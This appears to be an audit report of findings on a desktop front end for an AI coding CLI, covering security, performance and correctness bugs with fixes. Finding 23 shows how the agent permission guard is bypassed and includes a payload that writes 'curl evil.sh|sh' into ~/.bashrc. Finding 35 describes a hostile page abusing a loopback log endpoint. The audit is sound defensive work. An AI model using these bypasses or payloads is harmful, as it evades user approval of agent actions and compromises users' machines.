`src/main/hooks/permission-server.ts:139` · security

The redirection guard is `segment.includes('>') && !segment.includes('>/dev/null') && !segment.includes('2>/dev/null') && !segment.includes('2>&1')`. The three exemptions are substring tests over the whole segment, not a check that the redirection *is* one of those forms. So the presence of `2>&1` anywhere in the segment — including after a real file redirect — makes the whole condition false and the write is treated as safe. Verified: `echo pwned > ~/.bashrc 2>&1` -> safe:true, whereas the same command without `2>&1` -> safe:false. The same trick works with `>/dev/null` appended.

**Failure scenario.** Hook POST with `tool_input.command: "echo 'curl evil.sh|sh' > ~/.bashrc 2>&1"`. Line 108 accepts base `echo`; line 139's guard is neutralised by the `2>&1` substring; the server auto-allows and the user's shell profile is overwritten with no permission card.

**Suggested fix.** Strip the known-harmless redirection forms first (`2>&1`, `>/dev/null`, `2>/dev/null`) and then test whether any `>` remains, rather than testing the raw segment for their presence.

### 24. netFetch has no timeout or AbortSignal, and fetchCatalog fans out dozens of unthrottled, uncoalesced requests per refresh

`src/main/marketplace/catalog.ts:387` · performance

`netFetch` is `await fetch(url)` with no `signal` and no `AbortController`, and it also awaits `response.text()` with no cap. It backs every network call in this module. `fetchCatalog` issues one marketplace.json fetch per source, then one SKILL.md/plugin.json fetch per catalog entry (lines 136-197), plus the awesome README and one fetch per category file (lines 398-405) — roughly 40-70 concurrent requests, with no concurrency limit. Nothing bounds how long the whole operation takes: undici's default 300s headers/body timeouts are the only backstop, so a single stalled connection keeps the entire `Promise.allSettled` pending for five minutes. The sidecar dispatch loop (sidecar/index.ts:1070-1074) has no per-request timeout either, so the renderer's `marketplaceLoading` spinner at src/renderer/stores/sessionStore.ts:495 stays up the whole time. There is also no in-flight coalescing: each `forceRefresh` starts a completely new fan-out, and whichever completes last overwrites `cachedPlugins`/`cacheTimestamp` (lines 235-236), so an older, slower response can clobber a newer one.

**Failure scenario.** User opens the marketplace behind a captive portal or a proxy that blackholes connections to raw.githubusercontent.com. All ~50 fetches hang; fetchCatalog does not settle for ~5 minutes; the panel shows an indefinite spinner with no error and no cancel. Clicking Refresh three times during that window starts ~150 more sockets, and the response that lands last — not the newest — becomes the cached catalog.

**Suggested fix.** Give netFetch an AbortController with a per-request deadline (e.g. `AbortSignal.timeout(10_000)`) and pass it to fetch; add an overall deadline plus a small concurrency pool for the job fan-out; and store the in-flight fetchCatalog promise so concurrent callers share one refresh instead of racing to write the cache.

### 25. writeVersionFile runs after renameSync, so a crash in that window permanently marks the skill 'user-managed' and it is never installed or repaired again

`src/main/skills/installer.ts:145` · correctness

`installGithubSkill` renames the staged tmp dir into place (line 144) and only then writes `.clui-version` into the live target dir (line 145). The same ordering exists in `installBundledSkill` (lines 198-199). If `writeVersionFile` fails or the process dies between those two statements, `targetDir` is left fully populated with no `.clui-version`. The failure-path cleanup at line 154 tries `rmSync(tmpDir)`, but tmpDir no longer exists — it was renamed — so nothing is repaired. On the next startup `installSkill` (lines 218-226) sees the directory exists, `readVersionFile` returns null, and it takes the `!meta` branch: 'user-managed, don't touch' → `state:'skipped', reason:'user-managed'`. The skill is now permanently frozen; no version bump, no repair, and no amount of restarting will ever reinstall it, because the only escape is the user manually deleting the directory. The 'atomic install: tmp dir → validate → rename into place' promise in the module docstring is also not met: the sequence is rmSync(targetDir) at line 135 followed by renameSync at line 144, so a failure between them leaves the user with no skill at all where a working one existed.

**Failure scenario.** Antivirus or an indexer holds a handle in ~/.openclaw/skills/skill-creator during the swap, or the app is killed right after renameSync. writeFileSync of .clui-version throws EPERM. Result: ~/.openclaw/skills/skill-creator contains SKILL.md, agents/, scripts/ but no .clui-version. Every subsequent ensureSkills() run reports skill-creator as skipped/user-managed and never updates it, even when manifest.ts bumps commitSha or version.

**Suggested fix.** Write the version file into tmpDir before the swap (`writeVersionFile(tmpDir, entry)` immediately after validateSkill succeeds), then rename. Additionally, on the catch path detect that tmpDir is gone but targetDir lacks VERSION_FILE and remove targetDir so the next run reinstalls rather than treating it as user-managed.

### 26. Palette tokens colors.surfaceElevated and colors.shadowMid do not exist — undefined reaches the DOM ✅ **fixed**

`src/renderer/components/ConversationView.tsx:290` · correctness

I grepped every `colors.<key>` reference in src/renderer (59 distinct keys) against the ColorPalette shape defined by `darkColors` in src/renderer/theme.ts:15-143 (78 keys). Exactly two referenced keys are absent from the palette, from `derivePalette`'s output object (theme-derive.ts:268-402), and from both preset override blocks: `shadowMid` and `surfaceElevated`. Both are read in ConversationView's conversation-search bar: `shadowMid` at line 290, `surfaceElevated` at lines 311, 325 and 342. `useColors()` returns the derived palette object, which never has these keys, so both evaluate to `undefined` at runtime. `tsc --noEmit -p tsconfig.json` confirms all four sites: `error TS2339: Property 'shadowMid' does not exist on type 'ColorPalette'` (290,47) and `Property 'surfaceElevated' does not exist on type 'ColorPalette'` (311,38 / 325,38 / 342,119). These are the only two missing keys — every other `colors.X` in the renderer, and every `--clui-*` variable referenced in index.css, resolves to a real palette key.

**Failure scenario.** Open the launcher, expand a conversation and reveal the search bar. `boxShadow: `0 8px 24px ${colors.shadowMid}`` produces the string "0 8px 24px undefined", which is invalid CSS and is dropped by the parser, so the search pill renders with no elevation shadow in every theme. `background: colors.surfaceElevated` sets `background: undefined` on the prev-match button, next-match button and the third control at line 342, so all three render transparent against the pill instead of as raised buttons — on the dark presets (e.g. cathode-glow, bg #070a07) they become effectively invisible chrome. This is theme-independent: no built-in or custom theme can ever supply these keys.

**Suggested fix.** Either add `surfaceElevated` and `shadowMid` to the palette — declare them in `darkColors`/`lightColors` (theme.ts:15-273) and emit them from `derivePalette` (e.g. `surfaceElevated: toHex(mix(surface, textPrimary, 0.06))`, `shadowMid: shadowInk(darkBg ? 0.35 : 0.08)`) — or, if no new tokens are wanted, change ConversationView.tsx:290 to `colors.cardShadow` (which already carries the full shadow string, so drop the `0 8px 24px` prefix) and lines 311/325/342 to `colors.surfaceSecondary`. Running `npm run typecheck` in CI would have caught this at authoring time.

### 27. The streaming assistant message is re-parsed from scratch by remark on every chunk flush

`src/renderer/components/ConversationView.tsx:970` · performance

AssistantMessage is memoized on content equality (lines 999-1002), so it re-renders exactly when message.content changes — which is every rAF flush during streaming, since sessionStore.ts:932 appends the new text to the last assistant message. Line 970 then feeds the whole accumulated string to <Markdown remarkPlugins={REMARK_PLUGINS}>, and react-markdown re-tokenises and re-parses it end to end through micromark/mdast every time; the bundle carries that stack from roughly 540k to 700k (~160 kB, byte-probed). Hoisting REMARK_PLUGINS at line 23 avoids re-creating the plugin array but does nothing about the parse itself. The work is quadratic in the response length: the Nth flush parses N chunks' worth of text.

**Failure scenario.** A 20 kB reply streamed over 10 seconds flushes ~600 times, parsing an average of 10 kB each — roughly 6 MB of markdown tokenisation for a single response, with the per-frame cost growing as the answer gets longer, so long answers visibly stutter near the end.

**Suggested fix.** Render the tail (still-streaming) message as plain text or with a cheap throttle (parse at most every ~150 ms via a debounced copy of the content), and switch to the full Markdown render once the message is no longer the streaming tail. Alternatively split the content on the last complete block boundary and only re-parse the trailing fragment.

### 28. ToolGroup re-runs JSON.parse over every tool input on every render during streaming

`src/renderer/components/ConversationView.tsx:1081` · performance

ToolGroup (line 1046) is a plain function component — unlike AssistantMessage (line 898) it has no React.memo. Line 1081 calls getToolDescription(toolName, tool.toolInput) for every tool in the group on every render, and getToolDescription does `JSON.parse(input)` at line 1022. tool.toolInput is the full serialised tool payload: sessionStore.ts:1023 stores it as `JSON.stringify(block.input, null, 2)`, which for a Write or Edit call is the entire file body. The expanded branch that does the per-tool parsing is entered whenever `hasRunning` is true (lines 1047, 1051, 1053) — i.e. precisely while the agent is streaming, when ConversationView re-renders at up to 60 Hz from the text_chunk flush. ToolIcon (line 1249) compounds it by constructing a fresh Record of 10 JSX elements per tool per render (lines 1251-1262).

**Failure scenario.** Agent runs a Write with a 40 kB file body while streaming commentary. Every rAF flush re-parses that 40 kB of JSON (plus every other tool input in the visible group) and rebuilds 10 icon elements per tool — tens of MB of JSON parsing per second, purely to recompute a truncated one-line label that never changes after the tool completes.

**Suggested fix.** Wrap ToolGroup in React.memo, and memoize the description per message (e.g. a useMemo keyed on tool.id + tool.toolInput, or compute the label once in the store when the tool completes). Hoist the ICONS map in ToolIcon to module scope.

### 29. SettingsPopover runs a permanent rAF loop doing getBoundingClientRect plus setState every frame

`src/renderer/components/SettingsPopover.tsx:114` · performance

The effect at lines 111-122 starts a self-rescheduling requestAnimationFrame loop that calls updatePos() every frame for as long as the popover is open. updatePos (lines 64-90) calls triggerRef.current.getBoundingClientRect() — a forced synchronous layout — then unconditionally calls setPos with a freshly allocated object literal (lines 73-77 or 81-89). Because the object identity is always new, React commits a re-render of SettingsPopover and its portalled menu on every single frame, even when the trigger has not moved by a pixel. The loop has no termination condition tied to the 260 ms layout transition it exists to track (TRANSITION in App.tsx:20); it runs for the entire time the menu is open, and since the window parks off-screen rather than hiding (shell/src/main.cpp:431), it keeps running if the user dismisses with the popover open.

**Failure scenario.** User opens quick settings and reads the menu for ten seconds: 600 forced layouts and 600 React commits of the popover subtree, for a trigger button whose position changed only during the first 260 ms.

**Suggested fix.** Bail out of the state write when the rect is unchanged (compare right/top/bottom/maxHeight against the previous values before calling setPos), and stop the loop once the position has been stable for a few frames or after SETTLE_CAP_MS — the same stable-frame technique already used in App.tsx:175-190.

### 30. Zustand v5 selector equality functions are ignored, so these components re-render on every stream event ✅ **fixed**

`src/renderer/components/StatusBar.tsx:292` · performance

zustand is `^5.0.0` (package.json), where `useStore(selector, equalityFn)` no longer accepts a second argument — it was removed in v5 and is silently dropped at runtime. Three call sites still pass one and depend on it for memoization: StatusBar.tsx:292-298, StatusBar.tsx:19 (ModelPicker), and HistoryPicker.tsx:33. All three select `s.tabs.find((t) => t.id === s.activeTabId)`, and `handleNormalizedEvent` rebuilds the tab object on *every* event (`const updated = { ...tab, lastEventAt: Date.now() }`, sessionStore.ts:900) — including every RAF-batched `text_chunk`. With the equality function dead, the comparison falls back to `Object.is` on a reference that changes every time.

**Failure scenario.** During a streaming reply, ~60 `text_chunk` flushes per second each produce a new tab object. StatusBar, ModelPicker and HistoryPicker re-render on all of them — including HistoryPicker's popover and ModelPicker's model list — even though none of the fields the equality functions guard (`status`, `sessionModel`, `workingDirectory`, `additionalDirs`, `hasChosenDirectory`, `claudeSessionId`) changed. The intended memoization never runs.

**Suggested fix.** Import `useShallow` from `zustand/react/shallow`, or select the primitive fields directly (`useSessionStore((s) => s.tabs.find((t) => t.id === s.activeTabId)?.status)` etc.) so the comparison is on scalars rather than a per-event object reference. Delete the second arguments.

### 31. Dead zustand v5 equality fn in StatusBar — re-renders on every streaming token ✅ **fixed**

`src/renderer/components/StatusBar.tsx:292` · performance

Same dead-argument bug as ModelPicker, and this one guards five fields (`status`, `additionalDirs`, `hasChosenDirectory`, `workingDirectory`, `claudeSessionId`). zustand 5.0.11's `useBoundStore = (selector) => useStore(api, selector)` never forwards the comparator, so the whole five-way check is unreachable code and the store falls back to `Object.is` on the tab object — which `handleNormalizedEvent` replaces on every event.

**Failure scenario.** During any streaming reply, StatusBar re-renders once per `text_chunk`. Because StatusBar renders `<ModelPicker/>` and `<PermissionModePicker/>` as children, each of those subtrees is re-rendered too, and `compactPath()` plus the `dirTooltip` join over `additionalDirs` re-run on every token — for state (working directory, session id) that did not change once during the entire response.

**Suggested fix.** Replace with `useShallow`, or select the five fields as separate primitive subscriptions so `Object.is` actually short-circuits.

### 32. declare module '*.mp3' in env.d.ts is inert because the file is a module, so the audio import has no type ✅ **fixed**

`src/renderer/env.d.ts:3` · type-safety

env.d.ts:1 begins with `import type { CluiAPI } from '../shared/clui-contract'`, which makes the file a module rather than a global script. Inside a module, `declare module '*.mp3' { ... }` at line 3-6 is parsed as a module augmentation scoped to that file, not as an ambient wildcard module declaration, so it never registers globally. Nothing else supplies the declaration: tsconfig.json has no `types: ["vite/client"]` and there is no `/// <reference types="vite/client" />` anywhere in the repo (grep for `vite/client` returns no matches outside node_modules). I confirmed the consequence with `tsc --noEmit -p tsconfig.json`: `src/renderer/stores/sessionStore.ts(4,29): error TS2307: Cannot find module '../../../resources/notification.mp3' or its corresponding type declarations.` The asset itself exists at resources/notification.mp3, so this is purely the declaration failing to apply. Note the two `declare global { interface Window { ... } }` blocks at lines 8-21 DO work, because `declare global` is exactly the escape hatch for a module file — the mp3 block is the one that needed it and did not get it.

**Failure scenario.** Run `npm run typecheck` (tsc --noEmit): it reports TS2307 on sessionStore.ts:4. The build itself still succeeds because `vite build` uses esbuild and never typechecks, so the error is invisible until someone wires typecheck into CI — at which point CI is red for a reason unrelated to the change being made. Meanwhile `notificationSrc` is typed as an error/any, so a typo in the asset path is not caught.

**Suggested fix.** Either move the wildcard declaration into a genuinely global .d.ts (a file with no top-level import/export), or keep it here and reference the ambient types Vite already ships by adding `/// <reference types="vite/client" />` at the top of env.d.ts — vite/client declares `*.mp3` (and every other asset extension) for you, which also removes the need for the hand-rolled block.

### 33. RAF text buffer is not flushed before tool_call, so trailing streamed text renders below the tool card

`src/renderer/hooks/useClaudeEvents.ts:51` · correctness

`text_chunk` events are accumulated into `chunkBufferRef` and flushed on the next animation frame (lines 35-43). The synchronous pre-flush at lines 51-57 is applied only to `task_update` and `task_complete`; every other event type — `tool_call`, `error`, `session_dead`, `gateway_state` — is handed to `handleNormalizedEvent` immediately while text is still buffered. Because `text_chunk` in the store appends to the tail only when the last message is a plain assistant message (`if (lastMsg?.role === 'assistant' && !lastMsg.toolName)`, sessionStore.ts:929), a tool/system message inserted first forces the buffered text into a brand-new assistant bubble appended *after* it. In the Claude CLI transport `content_block_stop` for the text block and `content_block_start` for the following tool_use arrive back to back on the same stdout stream (event-normalizer.ts:65-98), microseconds apart and far inside one ~16ms frame, so the last frame's worth of tokens is orphaned on essentially every tool call in a run.

**Failure scenario.** Assistant streams "Let me check the config file" then calls Read. The first ~10 tokens flush on frame N; the final tokens ("config file") are still buffered when `tool_call` arrives. The tool card is appended, then the RAF fires and appends "config file" as a new assistant bubble below the tool card. The user sees "Let me check the" / [Read tool] / "config file", and any post-tool narration merges into that same misplaced bubble.

**Suggested fix.** Flush unconditionally for every non-`text_chunk` event (drop the type check at lines 51-53 and always `cancelAnimationFrame` + `flushChunks()` before `handleNormalizedEvent`), or flush only the buffer for `tabId` so ordering is preserved per tab.

### 34. A custom theme whose id collides with a built-in is permanently shadowed and silently lost on restart

`src/renderer/theme.ts:536` · correctness

`resolveTheme` (theme.ts:535-537) is `findBuiltIn(id) || customs.find((t) => t.id === id) || findBuiltIn(DEFAULT_THEME_ID)!` — built-ins always win an id tie. Nothing prevents the tie: `upsertCustomTheme` (theme.ts:603-609) only de-duplicates within `customThemes` (`get().customThemes.filter((t) => t.id !== custom.id)`) and never checks `findBuiltIn(custom.id)`; `validateTheme` accepts any non-empty id string. The collision is easy to create because `exportTheme` (AppearancePanel.tsx:69) exports the ACTIVE theme as-is, and for a built-in that object carries `id: 'openclaw'` (theme-presets.ts:20). Round-tripping export -> edit -> import therefore produces a custom theme with a built-in id. Two consequences follow: (a) `commit` persists `themeId: s.theme.id` = 'openclaw' (theme.ts:555), so on the next launch `resolveTheme` at line 539 returns the built-in and the user's edits are gone; (b) `selectTheme` (line 598-601) also goes through `resolveTheme`, so clicking the custom card selects the built-in instead. Additionally AppearancePanel.tsx:82 builds `allThemes = [...BUILT_IN_THEMES, ...customThemes]` and line 95 keys cards by `t.id`, so the collision also yields duplicate React keys and two cards both showing the active checkmark.

**Failure scenario.** User is on the OpenClaw preset, clicks Export, tweaks a couple of hex values in the saved JSON, clicks Import. The theme applies immediately (upsertCustomTheme calls commit with it directly), so it looks like it worked. Clicking any other theme card and clicking back — or simply restarting the app — resolves id 'openclaw' to the built-in, and the edited theme becomes unreachable forever: it is still sitting in localStorage `customThemes`, still rendered as a card, but every path to it goes through resolveTheme and returns the built-in.

**Suggested fix.** Make `upsertCustomTheme` re-key on collision: `const id = findBuiltIn(theme.id) ? `${theme.id}-custom-${Date.now().toString(36)}` : theme.id` (mirroring the fork logic already in `updateActiveTheme` at theme.ts:616), and store `{...check.theme, id, builtIn: false}`. Optionally strip `builtIn` and re-key at export time instead, so exported files can never re-enter as built-in ids.

## Low

### 35. Loopback HTTP server performs no Origin/Host validation and /__log is an unauthenticated file append

`sidecar/index.ts:93` · security

The server created at line 86 serves every file under WEB_ROOT (the app's exe directory, set at shell/src/main.cpp:253) to any requester with no Origin check, no Host check and no shared secret — binding to 127.0.0.1 stops off-machine traffic but not the user's own browser, and the missing Host check also leaves it open to DNS rebinding. The `/__log` branch is worse: it takes the `m` query parameter and `appendFileSync`s it into `page.log` inside WEB_ROOT (line 97), unauthenticated, unbounded and with no length limit. `url.searchParams.get` decodes percent-escapes, so `%0A` injects real newlines into the log.

**Failure scenario.** The user visits a hostile page while the app is running. `new Image().src = 'http://127.0.0.1:17817/__log?m=' + payload` in a loop appends attacker-chosen content to the install directory's page.log until the disk fills (no CORS preflight applies to an image/GET, so the write happens even though the response is unreadable). The same page can also probe `http://127.0.0.1:17817/<path>` to fingerprint the install and read any file under the exe directory via a script/style tag.

**Suggested fix.** Reject requests whose `Host` header is not `127.0.0.1:<WEB_PORT>`/`localhost:<WEB_PORT>` and whose `Origin`, when present, is not the server's own origin; require a boot-generated token (the shell already passes env vars to the sidecar) on `/__log`, cap its body length, and cap page.log with a size roll.

### 36. GET_RUNTIME_METRICS returns {cpu, memory} but the contract and renderer read cpuPercent/memoryMb

`sidecar/index.ts:632` · correctness

The contract declares `getRuntimeMetrics(): Promise<{ cpuPercent: number; memoryMb: number; uptimeSec: number; timestamp: number }>` (src/shared/clui-contract.ts:90). The handler returns `{ cpu: 0, memory: process.memoryUsage().rss }` — different key names, and `rss` is bytes where the field is declared in megabytes. Two of the four declared fields are absent entirely.

**Failure scenario.** ControlCenterPanel's Live Monitor polls once per second and does `setCpuPercent(metrics.cpuPercent || 0)` / `setMemoryMb(metrics.memoryMb || 0)` (src/renderer/components/ControlCenterPanel.tsx:170-171). Both properties are undefined, so the CPU and Memory readouts display a hard 0 forever regardless of actual load.

**Suggested fix.** Return the declared shape: `{ cpuPercent, memoryMb: process.memoryUsage().rss / 1048576, uptimeSec: process.uptime(), timestamp: Date.now() }`, computing cpuPercent from a `process.cpuUsage()` delta between polls.

### 37. GATEWAY_CONFIG_SET mutates the memoised config object before validation can reject the patch

`sidecar/index.ts:830` · correctness

`readOpenclawConfig()` returns `configCache.value` by reference (line 195), and the handler mutates that object in place — `config.gateway.mode = mode` at line 830 — before the validation early-returns at lines 842, 847, 850 and 860. Those returns leave the cache holding a mutated config that was never written to disk, and because the cache key is `mtimeMs:size` of an untouched file (line 194), every later read keeps returning the mutated object until the CLI itself rewrites the file or the app restarts. Only the success path at line 866 clears the cache.

**Failure scenario.** A `gatewayConfigSet({ mode: 'remote', remoteUrl: 'not a url' })` call — all three fields are declared optional-and-combinable in the contract at src/shared/clui-contract.ts:104 — returns `{ ok: false, error: 'Not a valid URL: ...' }` and writes nothing. But `isRemoteGatewayMode()` (line 277) now reads 'remote' from the poisoned cache, so OPENCLAW_MODEL_INFO starts taking the gateway path against a gateway that was never configured, and GATEWAY_CONFIG_GET reports a mode that is not in openclaw.json.

**Suggested fix.** Work on a deep copy — `const config = structuredClone(readOpenclawConfig())` — or validate every field before applying any mutation, so a rejected patch cannot alter in-memory state.

### 38. describe-files splits the basename on '/' only, so Windows attachments are named with their full path

`sidecar/index.ts:963` · ux

`name: path.split(/[\/]/).pop()` — inside a character class `\/` is just an escaped forward slash, so the class matches `/` and nothing else; the intended pattern was `/[\\/]/`. Every path reaching this handler comes from the shell's Win32 pickers (`pick_files` in shell/src/native_ui.hpp:68 wraps GetOpenFileNameW, and capture_screen returns a written file path), which produce backslash-separated paths.

**Failure scenario.** User attaches C:\Users\Alpas\Pictures\diagram.png via the paperclip. The split finds no '/', `.pop()` returns the whole string, and the attachment chip renders `C:\Users\Alpas\Pictures\diagram.png` as its name instead of `diagram.png`, blowing out the chip width and leaking the user's directory layout into the transcript UI.

**Suggested fix.** Use `basename(path)` from node:path (already an import site in this file) instead of the hand-rolled split.

### 39. Failed run start leaks the hook settings file and leaves the run token registered

`src/main/claude/control-plane.ts:845` · leak

`_dispatch` registers the run token and writes the per-run hook settings file at lines 807-812, before starting the transport. If `startRun` throws (line 845), the catch block rolls back the tab state and rethrows but never calls `this.permissionServer.unregisterRun(runToken)` and never removes the `this.runTokens` entry — unlike the runManager `exit`/`error` handlers (lines 199-203, 263-267) which do. The token therefore stays accepted by `_handleRequest` (line 492) and the file stays in `%TEMP%/clui-hook-config` for the whole app run. A synchronous `startRun` throw is not hypothetical: `spawn`/`execFile` throw EINVAL synchronously when `CliRuntime.command` is the `.cmd` shim that `runtime.ts:72` prefers.

**Failure scenario.** On a Windows box where the CLI resolves to `openclaw.cmd`, every prompt makes `startRun` throw synchronously; each one leaves a `clui-hook-<uuid>.json` in the temp dir and a permanently registered run token. Twenty failed prompts leave twenty live tokens and twenty files, cleaned only if the process exits gracefully through `shutdown()`.

**Suggested fix.** In the catch block at line 845, call `this.permissionServer.unregisterRun(runToken)` and `this.runTokens.delete(requestId)` before rethrowing.

### 40. Tool-name regex can never match its own documented prompt format (missing separator before the capture group)

`src/main/claude/pty-run-manager.ts:115` · correctness

`/(?:wants?\s+to\s+(?:use|run|execute)|Tool:\s*|tool_name:\s*)(\w+)/i` has no `\s*` between the `wants to use` alternative and `(\w+)`. The `Tool:` and `tool_name:` alternatives each end in `\s*`, so the omission is clearly unintended. Consequence 1: the format the file documents at lines 105-107 never matches, so `toolName` falls through to 'Unknown' on every real prompt and the permission card cannot name the tool. Consequence 2: the +3 confidence bonus is never awarded, so a real prompt must score 4 from keywords/options alone — which the actual Claude Code prompt (numbered options) does not do, and the prompt is missed entirely, leaving the PTY blocked forever.

**Failure scenario.** Input window:
```
Claude wants to use Bash
  ls -la
❯ 1. Yes
  2. No, and tell Claude what to do differently
```
`toolMatch` fails (after `use` the next char is a space, not `\w`), so +3 is lost. Keywords: no allow/deny/reject/permission/approve -> 0. `hasOptions` needs `❯` followed by `\s*` then Allow|Deny|Yes|No, but the text is `❯ 1. Yes` -> no match, so +2 is lost. Total confidence 0 -> `detectPermissionPrompt` returns null, no permission_request is emitted, and the run hangs until the 5-minute-less quiescence path or process exit.

**Suggested fix.** Change the alternation to `/(?:wants?\s+to\s+(?:use|run|execute)\s+|Tool:\s*|tool_name:\s*)(\w+)/i`, and extend `hasOptions` to accept numbered selectors, e.g. `/(?:❯|›|>)\s*\d+[.)]?\s*(?:Allow|Deny|Yes|No)/i`.

### 41. Process-global 300-line dedup set drops repeated content across messages and across tabs

`src/main/claude/pty-run-manager.ts:834` · correctness

`recentLineSet`/`recentLines` are fields of `PtyRunManager` (lines 422-423), not of the run handle, and `_rememberLine` (line 845) never resets between runs. Line 834 discards any line already present in that 300-entry set once `sawPromptEcho` is true, so a line emitted by one run — or earlier in the same run — is silently removed from a later response of a completely different tab/session.

**Failure scenario.** An OpenClaw response containing a fenced code block emits the line ``` twice (open and close). The first is remembered at line 845; the second matches `_isDuplicateLine` and is dropped, so the renderer receives an unterminated code fence and renders the entire remainder of the message as code. Likewise, asking two different tabs the same question makes the second answer render as empty, because every one of its lines is already in the shared set.

**Suggested fix.** Move `recentLineSet`/`recentLines` onto `PtyRunHandle` so the window is per-run, and exclude structural/short lines (fences, punctuation-only) from dedup entirely.

### 42. Unguarded writes to child.stdin can take the whole sidecar down with an unhandled EPIPE

`src/main/claude/run-manager.ts:292` · crash

`child.stdin!.write(userMessage + '\n')` at line 292 runs synchronously right after `spawn`, and `writeToStdin` writes again at line 308 guarded only by `stdin.destroyed` (line 304), which is still false at the moment the pipe breaks. There is no `error` listener on `child.stdin` anywhere in `src/` (grep for `stdin.on`/`stdin?.on`/`stdin!.on` returns no matches), so an EPIPE / ERR_STREAM_DESTROYED on that socket is an unhandled 'error' event, which Node turns into an uncaught exception. `sidecar/index.ts` installs no `process.on('uncaughtException')` or `unhandledRejection` handler, so the sidecar process dies — taking down the loopback server, every tab, and the permission server, instead of surfacing the enriched error that `getEnrichedError` (line 338) exists to produce. The `try { child.stdin?.end() } catch {}` at line 243 does not help: the failure is an async event, not a synchronous throw. This transport is selected when the CLI is not OpenClaw and `CLUI_INTERACTIVE_PERMISSIONS_PTY=0` (control-plane.ts:826, sidecar/index.ts:132).

**Failure scenario.** With `CLUI_INTERACTIVE_PERMISSIONS_PTY=0` and the `claude` binary missing, `spawn` succeeds in creating the ChildProcess object but the handle fails with ENOENT. The prompt write at line 292 is already queued on the never-connected pipe; when the spawn error is processed the pending write fails with EPIPE, the stdin socket emits 'error' with no listener, and the sidecar exits. The same happens on the live path when the CLI exits early (e.g. it rejects a stale `--resume` id at line 127) and the user then answers a permission card, driving `respondToPermission` -> `writeToStdin` (control-plane.ts:950) into the closed pipe.

**Suggested fix.** Attach `child.stdin?.on('error', (e) => this._ringPush(handle.stderrTail, `[stdin] ${e.message}`))` immediately after the spawn at line 182, before any write. Wrap the writes at lines 292 and 308 in try/catch as well, and have `writeToStdin` check `stdin.writable` rather than only `destroyed`.

### 43. getCliPath spawns three login shells synchronously and never stops at the first success

`src/main/cli-env.ts:65` · performance

The loop at lines 63-70 has no `break`: on POSIX it always runs all three of `zsh -ilc`, `zsh -lc` and `bash -lc`, appending each result, even when the first one succeeded. The comment on line 56 ("Try an interactive login shell first") and the `catch` comment ("Keep trying fallbacks") both describe fallback behaviour the code does not implement. Each call is `execSync` with a 3000 ms timeout, so this blocks the sidecar's event loop for up to 9 s — and the sidecar is the process that serves the renderer and every window.clui channel. It is reached from `getCliEnv` (line 81), which `runCliAsync` calls on the async probe path (cli-probe.ts:119) whose own header comment states "Nothing may use a synchronous spawn for CLI work".

**Failure scenario.** First CLI probe on macOS/Linux with a slow zsh profile (nvm + asdf): all three shells are spawned in series, the sidecar's event loop is blocked for several seconds, and every renderer RPC queued behind it stalls even though the first shell already returned a usable PATH.

**Suggested fix.** `break` out of the loop as soon as a command returns a non-empty PATH, and move the discovery off the synchronous path (resolve it once at startup with an async spawn and await the cached promise).

### 44. flushLogs is exported as the shutdown drain but never called, so the sidecar's exit path drops buffered log lines

`src/main/logger.ts:42` · dead-code

`log()` buffers lines and flushes only every 500ms or once 64 lines accumulate (lines 32-36). `flushLogs()` is documented as 'Call on shutdown to guarantee every buffered or in-flight line is persisted before the process exits', but grepping the whole repository for `flushLogs` yields exactly one hit — its own definition. The sidecar's stdin `close` handler (sidecar/index.ts:1076-1091) calls `flushProbeCache()` and `controlPlane.shutdown()` and then `process.exit(0)` at line 1090 without draining the logger, and `process.exit` abandons pending libuv work, so the in-flight async `appendFile` from line 21 may never land either. The result is that the log lines closest to a shutdown — the ones most likely to explain why the app is exiting — are the ones systematically lost. Separately, the implementation is not correct if it ever is wired up: lines 45-50 synchronously re-append every chunk still sitting in `inFlight`, but those chunks were already handed to `appendFile` and may already have been written; the pending async write will then append the same bytes a second time, producing duplicated log regions.

**Failure scenario.** Sidecar logs 10 lines and exits 100ms later. The interval has not fired and the buffer holds fewer than 64 entries, so nothing was ever written; process.exit(0) discards the buffer and all 10 lines vanish from ~/.clui-debug.log. If flushLogs were wired in as-is, any chunk whose appendFile callback had not yet fired would be written twice.

**Suggested fix.** Call flushLogs() in the sidecar close handler before process.exit(0), and fix the double-write by tracking write completion (write synchronously in flush(), or mark chunks as issued and only re-append those whose fs operation is provably unstarted).

### 45. process-manager.ts is unreachable dead code that still spawns with permissions bypassed

`src/main/process-manager.ts:28` · dead-code

`ProcessManager` is never instantiated or imported: grep for `ProcessManager` across the repo matches only its own class declaration at line 28, and grep for the module specifier `process-manager` matches nothing at all — including the built `shell/sidecar/main.cjs`. It is a pre-saucer duplicate of `RunManager` and has drifted: the constructor comment at lines 34-35 and the env comment at lines 78-79 still describe Electron, it hardcodes `--permission-mode acceptEdits` (line 49) and `--chrome` (line 50) so it would bypass the permission server that `control-plane.ts` now depends on, its `cancelRun` escalates SIGINT to SIGTERM rather than SIGKILL (line 152) — a signal the CLI can ignore just as easily — and it never removes the run from `activeRuns` on the SIGTERM path. It also carries the same unguarded `child.stdin!.write` at line 136 described in the crash finding above.

**Failure scenario.** No runtime failure — it is not wired up. The defect is that it compiles and reads as a live transport: anyone tracing the run lifecycle finds two spawn implementations with contradictory permission policies (`acceptEdits` here vs `default` + hook server in run-manager.ts:123), and a future caller wiring this one in would silently disable the permission card for every tool call.

**Suggested fix.** Delete src/main/process-manager.ts. Its only unique consumer surface, `StreamParser.fromStream`, is already exercised by run-manager.ts:200.

### 46. exec's 60s timeout kills only the shell, so a stalled curl|tar leaves an undeletable .tmp-* directory inside the live skills folder

`src/main/skills/installer.ts:121` · leak

The download runs `curl -sL <tarball> | tar -xz --strip-components=N -C <tmpDir> ...` through `exec` with `timeout: 60000`. On Windows `exec` spawns cmd.exe and the timeout terminates that process handle only — curl and tar are separate processes in the pipeline and are not in a job object, so they survive and keep writing into tmpDir. The catch block then immediately runs `rmSync(tmpDir, {recursive:true, force:true})` (line 154) against a directory a live tar process still holds open; on Windows that throws EBUSY/EPERM, and the `catch {}` swallows it. The staging directory is created inside SKILLS_DIR itself (line 93: `join(SKILLS_DIR, '.tmp-<name>-<uuid>')`), not in os.tmpdir(), and nothing anywhere in the repo ever sweeps `.tmp-*` — grepping for `.tmp-` finds only these two creation sites. Every timed-out or crashed install therefore leaves a permanent uniquely-named directory in ~/.openclaw/skills/. `listInstalled` in catalog.ts:267-272 does a plain `readdir(..., {withFileTypes:true})` and pushes every directory name, so these leftovers are reported to the renderer as installed plugins.

